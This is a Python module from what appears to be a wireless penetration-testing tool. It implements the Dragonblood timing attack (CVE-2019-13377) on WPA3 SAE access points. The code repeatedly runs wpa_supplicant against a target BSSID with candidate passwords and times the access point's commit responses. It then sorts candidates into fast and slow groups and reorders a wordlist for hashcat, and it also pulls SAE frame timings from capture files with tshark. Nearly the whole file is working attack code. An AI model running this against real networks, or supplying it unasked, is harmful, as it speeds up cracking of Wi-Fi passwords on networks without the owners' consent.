#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Dragonblood Timing Attack Implementation (CVE-2019-13377)

Exploits timing side-channels in SAE authentication when APs use
MODP groups 22, 23, or 24.  The quadratic residue test during
password element derivation (hunting-and-pecking) leaks measurable
timing differences that partition the password search space.

Attack flow:
  1. Send SAE Commit probes using wpa_supplicant with candidate passwords
  2. Capture AP response times from pcap frame timestamps
  3. Classify passwords as "fast" (fewer H2E iterations) or "slow" (more)
  4. Reorder the wordlist so fast candidates are tried first by hashcat

References:
  - https://wpa3.mathyvanhoef.com/
  - https://papers.mathyvanhoef.com/dragonblood.pdf
  - CVE-2019-13377, CVE-2019-13456
"""

import os
import re
import time
import tempfile
import statistics
from typing import List, Dict, Optional
from dataclasses import dataclass, field

from ..util.process import Process
from ..util.color import Color
from ..util.logger import log_info, log_debug, log_warning, log_error
from ..config import Configuration


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class TimingSample:
    """One SAE Commit -> Commit-Response timing measurement."""
    password: str
    response_time_us: float  # microseconds
    sae_group: int = 0
    success: bool = False    # True if AP responded (regardless of auth result)
    timestamp: float = 0.0   # epoch when probe was sent


@dataclass
class TimingAnalysis:
    """Results of statistical analysis on collected timing samples."""
    total_samples: int = 0
    mean_us: float = 0.0
    median_us: float = 0.0
    stdev_us: float = 0.0
    threshold_us: float = 0.0  # dividing line between fast/slow
    fast_passwords: List[str] = field(default_factory=list)
    slow_passwords: List[str] = field(default_factory=list)
    confidence: float = 0.0   # 0.0-1.0, how separable the two clusters are
    partition_ratio: float = 0.0  # fraction of passwords in the fast bucket


# ---------------------------------------------------------------------------
# Timing probe engine
# ---------------------------------------------------------------------------

class DragonbloodTimingAttack:
    """
    Implements CVE-2019-13377 timing-based password partitioning.

    Uses wpa_supplicant to send SAE Commit frames with candidate passwords
    and measures AP response latency from pcap timestamps.  Passwords that
    map to quadratic residues in MODP groups produce faster AP responses
    than non-residues, allowing the search space to be partitioned.
    """

    # Minimum samples needed for meaningful statistics
    MIN_SAMPLES = 10

    # Default timing threshold percentile (passwords below this are "fast")
    DEFAULT_THRESHOLD_PERCENTILE = 50

    # Minimum separation (in stdev units) to declare a useful partition
    MIN_SEPARATION_SIGMA = 0.5

    # Per-probe timeout (seconds)
    PROBE_TIMEOUT = 8

    # Inter-probe delay (seconds) to avoid AP rate-limiting
    PROBE_DELAY = 1.5

    # Leading epoch timestamp wpa_supplicant emits per debug line with ``-t``
    # (e.g. "1609459200.123456: SAE: ..."). Microsecond resolution.
    _LOG_TS_RE = re.compile(r'^(\d+\.\d+)')

    def __init__(self, interface: str, target_bssid: str, target_essid: str,
                 target_channel: int, sae_group: int = 0):
        from ..config.validators import validate_interface_name
        validate_interface_name(interface)
        self.interface = interface
        self.target_bssid = target_bssid
        self.target_essid = target_essid
        self.target_channel = target_channel
        self.sae_group = sae_group

        self.samples: List[TimingSample] = []
        self.analysis: Optional[TimingAnalysis] = None
        self._temp_files: List[str] = []

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def run(self, passwords: List[str],
            num_samples: int = 3,
            view=None) -> Optional[TimingAnalysis]:
        """
        Run timing probes against the target AP.

        For each candidate password, sends *num_samples* SAE Commit frames
        and records the AP's response latency.

        Args:
            passwords:   Candidate passwords to probe.
            num_samples: Repetitions per password (averaged for stability).
            view:        Optional TUI view for progress updates.

        Returns:
            TimingAnalysis with fast/slow partitioning, or None on failure.
        """
        if not passwords:
            log_warning('DragonbloodTiming', 'No passwords to probe')
            return None

        total = len(passwords) * num_samples
        completed = 0

        log_info('DragonbloodTiming',
                 f'Starting timing probes: {len(passwords)} passwords x '
                 f'{num_samples} samples = {total} probes')

        Color.pl('{+} {C}Dragonblood timing attack: probing %d passwords '
                 '(%d samples each){W}' % (len(passwords), num_samples))

        for pwd in passwords:
            pwd_times = []
            for trial in range(num_samples):
                try:
                    response_us = self._probe_password(pwd)
                    if response_us is not None:
                        pwd_times.append(response_us)
                        self.samples.append(TimingSample(
                            password=pwd,
                            response_time_us=response_us,
                            sae_group=self.sae_group,
                            success=True,
                            timestamp=time.time(),
                        ))
                except KeyboardInterrupt:
                    raise
                except Exception as e:
                    log_debug('DragonbloodTiming',
                              f'Probe failed for candidate: {e}')

                completed += 1
                if view:
                    pct = int(completed / total * 100)
                    view.update_progress({
                        'status': 'Timing probes',
                        'metrics': {
                            'Progress': f'{pct}%',
                            'Probed': f'{completed}/{total}',
                            'Samples': len(self.samples),
                        }
                    })

                # Delay between probes to avoid triggering AP rate-limits
                if trial < num_samples - 1:
                    time.sleep(self.PROBE_DELAY)

            # Log per-password summary
            if pwd_times:
                avg = statistics.mean(pwd_times)
                masked = pwd[:2] + '*' * max(0, len(pwd) - 2)
                log_debug('DragonbloodTiming',
                          f'  {masked}: avg={avg:.0f} us  '
                          f'({len(pwd_times)}/{num_samples} ok)')

            # Small delay between passwords
            time.sleep(self.PROBE_DELAY)

        # Analyse the collected samples
        self.analysis = self._analyse()
        return self.analysis

    def get_prioritised_wordlist(self, wordlist_path: str,
                                 output_path: Optional[str] = None
                                 ) -> Optional[str]:
        """
        Reorder a wordlist so that timing-fast candidates appear first.

        Reads *wordlist_path*, moves passwords classified as "fast" to the
        top, then appends the rest.  Writes the result to *output_path*.

        Returns:
            Path to the reordered wordlist, or None on failure.
        """
        if not self.analysis or not self.analysis.fast_passwords:
            log_warning('DragonbloodTiming',
                        'No timing analysis available for wordlist reordering')
            return None

        if not os.path.isfile(wordlist_path):
            log_error('DragonbloodTiming',
                      f'Wordlist not found: {wordlist_path}')
            return None

        fast_set = set(self.analysis.fast_passwords)

        if output_path is None:
            fd, output_path = tempfile.mkstemp(
                prefix='dragonblood_wl_', suffix='.txt',
                dir=Configuration.temp())
            os.close(fd)
            self._temp_files.append(output_path)

        try:
            # First pass: separate fast and slow
            fast_lines = []
            slow_lines = []
            with open(wordlist_path, 'r', errors='replace') as fh:
                for line in fh:
                    word = line.rstrip('\n\r')
                    if word in fast_set:
                        fast_lines.append(line)
                    else:
                        slow_lines.append(line)

            with open(output_path, 'w') as out:
                for line in fast_lines:
                    out.write(line)
                for line in slow_lines:
                    out.write(line)

            total = len(fast_lines) + len(slow_lines)
            log_info('DragonbloodTiming',
                     f'Reordered wordlist: {len(fast_lines)} fast + '
                     f'{len(slow_lines)} slow = {total} total -> {output_path}')

            Color.pl('{+} {G}Timing-optimised wordlist:{W} '
                     '{C}%d{W} fast candidates prioritised out of {C}%d{W}'
                     % (len(fast_lines), total))

            return output_path

        except Exception as e:
            log_error('DragonbloodTiming',
                      f'Failed to reorder wordlist: {e}')
            return None

    def cleanup(self):
        """Remove temporary files created during the attack."""
        for path in self._temp_files:
            try:
                if os.path.exists(path):
                    os.remove(path)
            except OSError:
                pass
        self._temp_files.clear()

    # ------------------------------------------------------------------
    # Timing probe via wpa_supplicant
    # ------------------------------------------------------------------

    def _probe_password(self, password: str) -> Optional[float]:
        """
        Send a single SAE Commit probe and measure AP response time.

        Creates a minimal wpa_supplicant config, starts it briefly, and
        parses its debug output for SAE commit/confirm timing.

        Returns:
            Response time in microseconds, or None if probe failed.
        """
        config_file = self._write_wpa_config(password)
        try:
            return self._measure_sae_timing(config_file)
        finally:
            self._remove_temp(config_file)

    def _measure_sae_timing(self, config_file: str) -> Optional[float]:
        """
        Run wpa_supplicant briefly and measure the SAE commit->response latency.

        Timing source: wpa_supplicant is run with ``-t`` so every debug line is
        prefixed with a microsecond-resolution epoch timestamp stamped by
        wpa_supplicant *when it processed the event*. The latency is computed
        from those embedded timestamps (commit sent -> peer commit received),
        NOT from when our Python loop happens to read the line. This removes
        the readline/poll-sleep jitter (tens of milliseconds) that would
        otherwise swamp the microsecond-scale Dragonblood signal.

        If wpa_supplicant doesn't emit parseable timestamps (e.g. ``-t``
        unsupported), we return None rather than a jitter-laden read-time
        measurement — an honest "no sample" beats a misleading number.

        NOTE: this is still a software-side measurement taken at the
        supplicant, so absolute values include local stack latency. It is
        adequate for the *relative* fast/slow partitioning across candidates
        probed under identical conditions, which is what the timing attack
        needs. For archived captures, the frame-timestamp path
        (extract_timing_from_pcap / compute_pcap_response_times) is preferred.

        Returns:
            Latency in microseconds, or None.
        """
        cmd = [
            'wpa_supplicant',
            '-i', self.interface,
            '-c', config_file,
            '-D', 'nl80211',
            '-t',   # prefix each debug line with a us-resolution epoch timestamp
            '-dd',  # extra-verbose debug output
        ]

        process = Process(cmd, devnull=False)
        commit_sent_ts = None
        commit_received_ts = None
        start = time.monotonic()

        try:
            while time.monotonic() - start < self.PROBE_TIMEOUT:
                if process.poll() is not None:
                    break

                try:
                    line = process.pid.stdout.readline()
                    if not line:
                        time.sleep(0.01)
                        continue
                    if isinstance(line, bytes):
                        line = line.decode('utf-8', errors='replace')

                    ts = self._parse_log_timestamp(line)

                    # Detect SAE commit sent. Use wpa_supplicant's own
                    # timestamp; ignore the event if it carries none (we
                    # can't measure accurately without it).
                    if 'SAE: Sending commit' in line or \
                       'SME: Trying to authenticate with' in line:
                        if commit_sent_ts is None and ts is not None:
                            commit_sent_ts = ts
                            log_debug('DragonbloodTiming',
                                      'SAE commit sent detected @ %.6f' % ts)
                        continue

                    # Detect SAE commit response received
                    if commit_sent_ts is not None and ts is not None and (
                        'SAE: Peer commit' in line or
                        'SAE: Processing commit' in line
                    ):
                        commit_received_ts = ts
                        log_debug('DragonbloodTiming',
                                  'SAE commit response detected @ %.6f' % ts)
                        break

                    # Early termination on auth failure
                    if '4-Way Handshake failed' in line or \
                       'CTRL-EVENT-AUTH-REJECT' in line or \
                       ('Authentication with' in line and 'timed out' in line):
                        break

                except Exception:
                    time.sleep(0.01)

        finally:
            import contextlib
            with contextlib.suppress(Exception):
                process.interrupt()
                time.sleep(0.3)
                if process.poll() is None:
                    process.kill()

        if commit_sent_ts is not None and commit_received_ts is not None:
            delta_us = (commit_received_ts - commit_sent_ts) * 1_000_000
            if delta_us > 0:
                return delta_us

        return None

    @classmethod
    def _parse_log_timestamp(cls, line: str) -> Optional[float]:
        """Parse the leading epoch timestamp wpa_supplicant emits with ``-t``.

        Returns the timestamp in seconds (float) or None if the line has no
        parseable timestamp prefix.
        """
        m = cls._LOG_TS_RE.match(line)
        if not m:
            return None
        try:
            return float(m.group(1))
        except ValueError:
            return None

    # ------------------------------------------------------------------
    # wpa_supplicant config helpers
    # ------------------------------------------------------------------

    def _write_wpa_config(self, password: str) -> str:
        """Create a temporary wpa_supplicant config for one SAE probe.

        Shares formatting with WPA3Detector._build_probe_config so both
        code paths agree on escaping (prevents ESSID/password values
        containing quotes or backslashes from corrupting the config).
        """
        from ..util.wpa3 import WPA3Detector
        content = WPA3Detector._build_probe_config(
            bssid=self.target_bssid,
            essid=self.target_essid,
            channel=self.target_channel,
            sae_group=self.sae_group,
            password=password,
        )
        fd, path = tempfile.mkstemp(
            prefix='dragon_probe_', suffix='.conf',
            dir=Configuration.temp())
        os.write(fd, content.encode('utf-8'))
        os.close(fd)
        os.chmod(path, 0o600)
        return path

    @staticmethod
    def _channel_to_freq(channel: int) -> int:
        if channel <= 13:
            return 2407 + channel * 5
        elif channel == 14:
            return 2484
        elif channel >= 36:
            return 5000 + channel * 5
        return 2412

    def _remove_temp(self, path: str):
        try:
            if path and os.path.exists(path):
                os.remove(path)
        except OSError:
            pass

    # ------------------------------------------------------------------
    # Statistical analysis
    # ------------------------------------------------------------------

    def _analyse(self) -> TimingAnalysis:
        """
        Analyse collected timing samples and partition passwords.

        Uses the median response time as the threshold to divide passwords
        into fast (fewer hunting-and-pecking iterations, likely quadratic
        residue) and slow (more iterations, likely non-residue) buckets.

        Confidence is derived from the separation between the two clusters
        relative to overall variance.
        """
        analysis = TimingAnalysis()

        if len(self.samples) < self.MIN_SAMPLES:
            log_warning('DragonbloodTiming',
                        f'Insufficient samples ({len(self.samples)}) for '
                        f'meaningful analysis (need {self.MIN_SAMPLES})')
            analysis.total_samples = len(self.samples)
            return analysis

        # Compute per-password average response times
        pwd_times: Dict[str, List[float]] = {}
        for s in self.samples:
            pwd_times.setdefault(s.password, []).append(s.response_time_us)
        pwd_avg = {p: statistics.mean(ts) for p, ts in pwd_times.items()}

        all_avgs = list(pwd_avg.values())

        analysis.total_samples = len(self.samples)
        analysis.mean_us = statistics.mean(all_avgs)
        analysis.median_us = statistics.median(all_avgs)
        analysis.stdev_us = (statistics.stdev(all_avgs)
                             if len(all_avgs) > 1 else 0.0)

        # Threshold: use median (robust against outliers)
        analysis.threshold_us = analysis.median_us

        # Partition
        for pwd, avg in pwd_avg.items():
            if avg <= analysis.threshold_us:
                analysis.fast_passwords.append(pwd)
            else:
                analysis.slow_passwords.append(pwd)

        n_fast = len(analysis.fast_passwords)
        n_slow = len(analysis.slow_passwords)
        total = n_fast + n_slow
        analysis.partition_ratio = n_fast / total if total else 0.0

        # Compute confidence: how well-separated are the two clusters?
        if n_fast >= 2 and n_slow >= 2 and analysis.stdev_us > 0:
            fast_mean = statistics.mean(
                [pwd_avg[p] for p in analysis.fast_passwords])
            slow_mean = statistics.mean(
                [pwd_avg[p] for p in analysis.slow_passwords])
            separation = abs(slow_mean - fast_mean) / analysis.stdev_us
            # Normalise to 0..1 (sigma=2 -> confidence=1.0)
            analysis.confidence = min(1.0, separation / 2.0)
        else:
            analysis.confidence = 0.0

        log_info('DragonbloodTiming',
                 f'Analysis: {analysis.total_samples} samples, '
                 f'mean={analysis.mean_us:.0f}us, '
                 f'stdev={analysis.stdev_us:.0f}us, '
                 f'fast={n_fast}, slow={n_slow}, '
                 f'confidence={analysis.confidence:.2f}')

        return analysis

    # ------------------------------------------------------------------
    # Reporting
    # ------------------------------------------------------------------

    def print_report(self):
        """Display timing attack results to the user."""
        if not self.analysis:
            Color.pl('{!} {O}No timing analysis available{W}')
            return

        a = self.analysis
        Color.pl('\n{+} {C}Dragonblood Timing Analysis (CVE-2019-13377):{W}')
        Color.pl('    Samples collected:  {C}%d{W}' % a.total_samples)
        Color.pl('    Mean response:      {C}%.0f{W} us' % a.mean_us)
        Color.pl('    Median response:    {C}%.0f{W} us' % a.median_us)
        Color.pl('    Std deviation:      {C}%.0f{W} us' % a.stdev_us)
        Color.pl('    Threshold:          {C}%.0f{W} us' % a.threshold_us)
        Color.pl('    Fast passwords:     {G}%d{W}' % len(a.fast_passwords))
        Color.pl('    Slow passwords:     {O}%d{W}' % len(a.slow_passwords))
        Color.pl('    Partition ratio:    {C}%.1f%%{W} fast' %
                 (a.partition_ratio * 100))

        if a.confidence >= 0.7:
            Color.pl('    Confidence:         {G}%.0f%%{W} '
                     '(strong separation)' % (a.confidence * 100))
        elif a.confidence >= 0.4:
            Color.pl('    Confidence:         {O}%.0f%%{W} '
                     '(moderate separation)' % (a.confidence * 100))
        else:
            Color.pl('    Confidence:         {R}%.0f%%{W} '
                     '(weak separation)' % (a.confidence * 100))

        if a.confidence < self.MIN_SEPARATION_SIGMA / 2.0:
            Color.pl('\n{!} {O}Timing differences too small for reliable '
                     'partitioning{W}')
            Color.pl('{!} {O}AP may have mitigations or network jitter '
                     'is too high{W}')

    # ------------------------------------------------------------------
    # Pcap-based timing (alternative to live probing)
    # ------------------------------------------------------------------

    @staticmethod
    def extract_timing_from_pcap(capfile: str, bssid: str
                                  ) -> List[Dict]:
        """
        Extract SAE Commit/Confirm frame timestamps from a pcap file.

        Useful for analysing timing from a previously captured exchange
        without needing to re-probe the AP.

        Returns:
            List of dicts with 'type' ('commit'/'confirm'), 'src', 'dst',
            'timestamp' (epoch float), 'sae_group'.
        """
        from ..tools.tshark import Tshark
        if not Tshark.exists():
            return []

        try:
            bssid_filter = f' && wlan.bssid == {bssid}' if bssid else ''
            filter_str = (
                'wlan.fc.type_subtype == 0x0b && '
                'wlan.fixed.auth.alg == 3'
                + bssid_filter
            )

            command = [
                'tshark', '-r', capfile,
                '-Y', filter_str,
                '-T', 'fields',
                '-e', 'frame.time_epoch',
                '-e', 'wlan.sa',
                '-e', 'wlan.da',
                '-e', 'wlan.fixed.auth.seq',
                '-e', 'wlan.fixed.auth.sae.group',
            ]
            proc = Process(command, devnull=False)
            output = proc.stdout()

            frames = []
            for line in output.split('\n'):
                line = line.strip()
                if not line:
                    continue
                parts = line.split('\t')
                if len(parts) < 4:
                    continue
                seq = parts[3].strip() if parts[3] else ''
                frame_type = 'commit' if seq == '1' else 'confirm'
                frames.append({
                    'type': frame_type,
                    'timestamp': float(parts[0]) if parts[0] else 0.0,
                    'src': parts[1],
                    'dst': parts[2],
                    'seq': seq,
                    'sae_group': int(parts[4]) if len(parts) > 4 and parts[4] else 0,
                })

            return frames

        except Exception as e:
            log_debug('DragonbloodTiming',
                      f'Pcap timing extraction failed: {e}')
            return []

    @staticmethod
    def compute_pcap_response_times(frames: List[Dict], ap_bssid: str
                                     ) -> List[float]:
        """
        Compute AP response latencies from extracted pcap frame pairs.

        Pairs each client-sent SAE Commit with the next AP-sent SAE Commit
        and returns the time deltas in microseconds.
        """
        deltas = []
        pending_client_commit = None

        for f in sorted(frames, key=lambda x: x['timestamp']):
            if f['type'] != 'commit':
                continue
            # Client -> AP commit
            if f['src'] != ap_bssid and f['dst'] == ap_bssid:
                pending_client_commit = f['timestamp']
            # AP -> Client commit (response)
            elif f['src'] == ap_bssid and pending_client_commit is not None:
                delta_us = (f['timestamp'] - pending_client_commit) * 1_000_000
                if delta_us > 0:
                    deltas.append(delta_us)
                pending_client_commit = None

        return deltas
